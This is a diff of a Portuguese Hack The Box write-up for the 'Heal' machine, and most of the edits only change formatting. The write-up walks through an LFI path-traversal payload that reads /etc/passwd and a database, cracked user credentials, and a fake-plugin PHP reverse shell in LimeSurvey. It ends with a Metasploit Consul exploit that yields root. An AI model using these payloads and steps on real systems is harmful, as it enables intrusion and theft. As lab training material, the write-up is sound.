@@ -16,7 +16,7 @@ draft: false
 
 Olá mundo! Tudo bem com vocês? Sejam muito bem vindos à mais uma aventura na minha jornada no mundo da cibersegurança. Hoje vamos falar sobre **`Heal`**, uma máquina de dificuldade classificada como **média** no [Hackthebox](https://www.hackthebox.com).
 
-Nessa máquina nós encontramos uma falha **`LFI`** na função de download da **`API`** do site construído com **`Ruby on Rails`**. Usando essa falha conseguimos baixar o banco de dados e obter a **hash** do usuário **`ralph`**. Em outro subdomínio nós usamos as credenciais do **`ralph`** para logar no **`LimeSurvey`**, cuja versão é vulnerável à execução remota de código via plugin fake. Já conectados ao servidor, conseguimos obter a senha do usuário **`ron`** em um arquivo de configuração. Em seguida descobrimos que a aplicação **`Consul UI`** está rodando como root na porta **8500**. Para o root nos aproveitamos de uma falha no **`Consul UI`**, que permite execução de comandos no serviço de **`API`**.
+Nessa máquina nós encontramos uma falha **`LFI`** na função de download da **`API`** do site construído com **`Ruby on Rails`**. Usando essa falha conseguimos baixar o banco de dados e obter a **hash** do usuário **`ralph`**. Em outro subdomínio nós usamos as credenciais do **`ralph`** para logar no **`LimeSurvey`**, cuja versão é vulnerável à execução remota de código via plugin fake. Já conectados ao servidor, conseguimos obter a senha do usuário **`ron`** em um arquivo de configuração. Em seguida descobrimos que a aplicação **`Consul UI`** está rodando como **`root`** na porta **8500**. Para o **`root`** nos aproveitamos de uma falha no **`Consul UI`**, que permite execução de comandos no serviço de **`API`**.
 
 ---
 
@@ -69,11 +69,11 @@ Nmap done: 1 IP address (1 host up) scanned in 18.94 seconds
            Raw packets sent: 11 (484B) | Rcvd: 11 (448B)
 ```
 
-O resultado do nmap indicou que havia apenas duas portas abertas. Como não tinha ainda as credenciais do SSH, passei a focar no site rodando na porta 80. Há também um redirecionamento para o domínio `heal.htb`. Assim, adicionei ao meu arquivo `/etc/hosts`
+O resultado do nmap indicou que havia apenas duas portas abertas. Como não tinha ainda as credenciais do [[SSH]], passei a focar no site rodando na porta **80**. Há também um redirecionamento para o domínio **`heal.htb`**. Assim, adicionei ao meu arquivo **`/etc/hosts`**
 
 > [!tip] 
 > Você pode adicionar o domínio ao arquivo /etc/hosts com o comando.
-> `echo "10.10.11.46 heal.htb"| sudo tee -a /etc/hosts`
+> **`echo "10.10.11.46 heal.htb"| sudo tee -a /etc/hosts`**
 
 ### Website
 
@@ -83,12 +83,12 @@ Visitando o site, é um construtor de currículos. Você pode criar uma conta, p
 
 ![[heal-1.png]]
 
-Então eu preenchi o currículo, baixei o **`pdf`**. Se eu tivesse capturado a request com Burpsuite, teria visto que o download é feito a partir de uma **`API`** e teria encontrado um novo subdomínio. Mas isso se corrigiu mais tarde.
+Então eu preenchi o currículo, baixei o **`pdf`**. Se eu tivesse capturado a request com **`Burpsuite`**, teria visto que o download é feito a partir de uma **`API`** e teria encontrado um novo subdomínio. Mas isso se corrigiu mais tarde.
 
-No alto da página havia um botão chamado Survey, que ao clicar nos redireciona ao subdomínio `take-survey.heal.htb`. Rapidamente adicionei o domínio ao arquivo `/etc/hosts`.
+No alto da página havia um botão chamado **Survey**, que ao clicar nos redireciona ao subdomínio **`take-survey.heal.htb`**. Rapidamente adicionei o domínio ao arquivo **`/etc/hosts`**.
 
 > [!tip] Adicionando ao /etc/hosts
-> `echo "10.10.11.46 take-survey.heal.htb" | sudo tee -a /etc/hosts`
+> **`echo "10.10.11.46 take-survey.heal.htb" | sudo tee -a /etc/hosts`**
 
 Ao visitar a página, há um novo formulário onde eu podia sugerir melhorias ao site. 
 
@@ -100,7 +100,7 @@ Talvez fosse um vetor de ataque, mas enquanto eu investigava o pdf com a ferrame
 
 ### Ffuf
 
-Já que havia um subdomínio, poderia haver outros. Usando a ferramenta **`ffuf`**, fiz uma varredura e encontrei uma `API`.
+Já que havia um subdomínio, poderia haver outros. Usando a ferramenta **`ffuf`**, fiz uma varredura e encontrei uma **`API`**.
 
 ```bash {25}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -132,9 +132,9 @@ api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Durati
 ```
 
 > [!tip] Adicionando ao /etc/hosts
-> `echo "10.10.11.46 api.heal.htb"| sudo tee -a /etc/hosts`
+> **`echo "10.10.11.46 api.heal.htb"| sudo tee -a /etc/hosts`**
 
-Visitando a página da API, descobri que ela foi construída em **`Ruby on Rails`**. As respectivas versões também estão à mostra, e isso pode ser de ajuda para encontrar possíveis exploits.
+Visitando a página da **`API`**, descobri que ela foi construída em **`Ruby on Rails`**. As respectivas versões também estão à mostra, e isso pode ser de ajuda para encontrar possíveis exploits.
 
 ![[heal-3.png]]
 
@@ -144,11 +144,11 @@ Visitando a página da API, descobri que ela foi construída em **`Ruby on Rails
 
 ### LFI
 
-Após preencher o currículo e baixá-lo novamente, percebi que a **`API`** era ativada e que era possível um ataque de **`LFI`** na **URL** `http://api.heal.htb/download?filename=`.
+Após preencher o currículo e baixá-lo novamente, percebi que a **`API`** era ativada e que era possível um ataque de **`LFI`** na **URL** **`http://api.heal.htb/download?filename=`**.
 
 ![[heal-5.png]]
 
-Trocando o nome do arquivo **`pdf`** por `/download?filename=../../../../../etc/passwd`, consegui baixar um arquivo com o conteúdo do arquivo **`/etc/passwd`** do servidor.
+Trocando o nome do arquivo **`pdf`** por **`/download?filename=../../../../../etc/passwd`**, consegui baixar um arquivo com o conteúdo do arquivo **`/etc/passwd`** do servidor.
 
 ```bash {39,45}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -198,7 +198,7 @@ _laurel:x:998:998::/var/log/laurel:/bin/false
 ron:x:1001:1001:,,,:/home/ron:/bin/bash
 ```
 
-Agora eu tinha dois possíveis usuários: `ralph` e `ron`. Lendo a documentação do **`Ruby`**, descobri que o local do arquivo `storage/development.sqlite3`. Então baixei o arquivo usando a ferramenta **`Curl`**.
+Agora eu tinha dois possíveis usuários: **`ralph`** e **`ron`**. Lendo a documentação do **`Ruby`**, descobri o local do arquivo **`storage/development.sqlite3`**, que é o banco de dados padrão. Então baixei o arquivo usando a ferramenta **`Curl`**.
 
 ```bash
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -240,7 +240,7 @@ sqlite> select * from users;
 sqlite>
 ```
 
-Em seguida quebrei a hash do ralph usando john the ripper.
+Em seguida quebrei a hash do **`ralph`** usando **`john the ripper`**.
 
 ```bash {8}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -256,24 +256,24 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-Eu já tinha um usuário e senha válido - `ralph : 147258369`. Mas essas credenciais não serviam no [[SSH]] e na página de currículo também não tinha muito o que fazer. Foi aí que entrando no subdomínio do survey, encontrei a página inicial que me informa que se trata de um LimeSurvey.
+Eu já tinha um usuário e senha válido - **`ralph : 147258369`**. Mas essas credenciais não serviam no [[SSH]] e na página de currículo também não tinha muito o que fazer. Foi aí que entrando no subdomínio do survey, encontrei a página inicial que me informa que se trata de um **`LimeSurvey`**.
 
 ### Limesurvey
 
 > [!question] O que é o LimeSurvey?
-> O LimeSurvey é uma ferramenta de pesquisa online simples, rápida e anônima, repleta de insights interessantes. Segundo o próprio site oficial, a ferramenta é grátis e tão fácil quanto espremer um limão.
+> O **LimeSurvey** é uma ferramenta de pesquisa online simples, rápida e anônima, repleta de insights interessantes. Segundo o próprio site oficial, a ferramenta é grátis e tão fácil quanto espremer um limão.
 
-Procurando por um exploit, encontrei este [artigo](https://ine.com/blog/cve-2021-44967-limesurvey-rce) que mostrava como acessar a página de login do LimeSurvey e como explorar a vulnerabilidade `CVE-2021-44967 LimeSurvey Authenticated RCE`.
+Procurando por um exploit, encontrei este **[artigo](https://ine.com/blog/cve-2021-44967-limesurvey-rce)** que mostrava como acessar a página de login do **`LimeSurvey`** e como explorar a vulnerabilidade **`CVE-2021-44967 LimeSurvey Authenticated RCE`**.
 
 ![[heal-6.png]]
 
-Usando as credenciais `ralph : 147258369`, consegui acesso ao dashboard do administrador.
+Usando as credenciais **`ralph : 147258369`**, consegui acesso ao dashboard do **administrador**.
 
 ![[heal-7.png]]
 
 ### Shell como www-data
 
-Eu encontrei o **[exploit](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE)** mencionado no artigo, porém estava um pouco desatualizado. Além disso, o código python dava erro. Então eu atualizei o código do arquivo `config.xml` e instalei o arquivo zip manualmente.
+Eu encontrei o **[exploit](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE)** mencionado no artigo, porém estava um pouco desatualizado. Além disso, o código **python** dava erro. Então eu atualizei o código do arquivo **`config.xml`** e instalei o arquivo **`zip`** manualmente.
 
 ```bash title=config.xml {11,21}
 <?xml version="1.0" encoding="UTF-8"?>
@@ -304,7 +304,7 @@ Eu encontrei o **[exploit](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE)** me
 
 ![[heal-8.png]]
 
-Primeiro, eu crio um arquivo chamado shell.zip com os arquivos `config.xml` e `php-rev.php`. Então eu faço a instalação como um novo plugin no dashboard do site. Uma vez instalado, eu ativo o "plugin" e por fim, vou até o caminho da minha shell reversa - `http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php`.
+Primeiro, eu crio um arquivo chamado **`shell.zip`** com os arquivos **`config.xml`** e **`php-rev.php`**. Então eu faço a instalação como um novo plugin no dashboard do site. Uma vez instalado, eu ativo o "plugin" e por fim, vou até o caminho da minha shell reversa - **`http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php`**.
 
 Com o netcat escutando, recebo rapidamente a conexão do servidor.
 
@@ -324,7 +324,7 @@ www-data@heal:/$
 
 ### Shell como ron
 
-Depois de procurar bastante, encontrei uma nova senha no arquivo `/limesurvey/application/config/config.php`
+Depois de procurar bastante, encontrei uma nova senha no arquivo **`/limesurvey/application/config/config.php`**
 
 ```bash {7}
 return array(
@@ -338,7 +338,7 @@ return array(
                         'tablePrefix' => 'lime_', 
 ```
 
-Usando as credenciais `ron@heal.htb : AdmiDi0_pA$$w0rd`, conseguir acesso via ssh. Aproveitei para pegar a flag do usuário também.
+Usando as credenciais **`ron@heal.htb : AdmiDi0_pA$$w0rd`**, conseguir acesso via ssh. Aproveitei para pegar a flag do usuário também.
 
 ```bash {37,38}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -385,7 +385,7 @@ c75125e78d031aced68b97c10001f473
 
 ## Escalação de Privilégios
 
-Listando os processos, encontrei o programa `/usr/local/bin/consul` rodando como root em localhost.
+Listando os processos, encontrei o programa **`/usr/local/bin/consul`** rodando como **`root`** em localhost.
 
 ```bash {9}
 on@heal:/$ ps aux | grep "root"
@@ -406,7 +406,7 @@ root        3391  0.0  0.0      0     0 ?        I    23:03   0:00 [kworker/u256
 ron         3396  0.0  0.0   6612  2308 pts/1    S+   23:03   0:00 grep --color=auto root 
 ```
 
-Fazendo uma pesquisa rápida sobre o programa `Consul` descobri que a porta padrão é a **8500**. Listando as conexões de rede, a porta **8500** estava aberta e na escuta.
+Fazendo uma pesquisa rápida sobre o programa **`Consul`** descobri que a porta padrão é a **8500**. Listando as conexões de rede, a porta **8500** estava aberta e na escuta.
 
 ```bash {20}
 ron@heal:/$ ss -tulnp
@@ -437,13 +437,13 @@ tcp             LISTEN           0                128                           
 
 ### Consul UI
 
-Para ver o conteúdo da porta 8500, fiz um `portforward` no ssh, com o comando `ssh -L 8888:127.0.0.1:8500 ron@heal.htb`. Isso permitiu que eu acessasse a página no endereço `127.0.0.1:8888` e visse o conteúdo da porta 8500 do servidor.
+Para ver o conteúdo da porta **8500**, fiz um **`portforward`** no **`ssh`**, com o comando **`ssh -L 8888:127.0.0.1:8500 ron@heal.htb`**. Isso permitiu que eu acessasse a página no endereço **`127.0.0.1:8888`** e visse o conteúdo da porta **8500** do servidor.
 
 Ao acessar, encontro o dashboard do `Consul UI`.
 
 ![[heal-10.png]]
 
-Usando a ferramenta `searchsploit`, encontrei um exploit para o consul UI no `metasploit framework`.
+Usando a ferramenta **`searchsploit`**, encontrei um exploit para o **`Consul UI`** no **`metasploit framework`**.
 
 ```bash
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -463,7 +463,7 @@ Shellcodes: No Results
 
 ### Mfsconsole
 
-Usando o `metasploit framework`, encontrei o exploit `exploit/multi/misc/consul_service_exec`, também conhecido como `Hashicorp Consul Remote Command Execution via Services API`. 
+Usando o **`metasploit framework`**, encontrei o exploit **`exploit/multi/misc/consul_service_exec`**, também conhecido como **`Hashicorp Consul Remote Command Execution via Services API`**. 
 
 Tudo que precisei foi configurar:
 
@@ -472,7 +472,7 @@ Tudo que precisei foi configurar:
 - **`LHOST`**=tun0
 - **`LPORT`**=9001
 
-Daí rodei o exploit com o comando `run` e abri um sorriso de satisfação. Também aproveitei e peguei a flag do root. 
+Daí rodei o exploit com o comando **`run`** e abri um sorriso de satisfação. Também aproveitei e peguei a flag do **`root`**. 
 
 ```bash {43-45}
 msf6 exploit(multi/misc/consul_service_exec) > set rhost 127.0.0.1
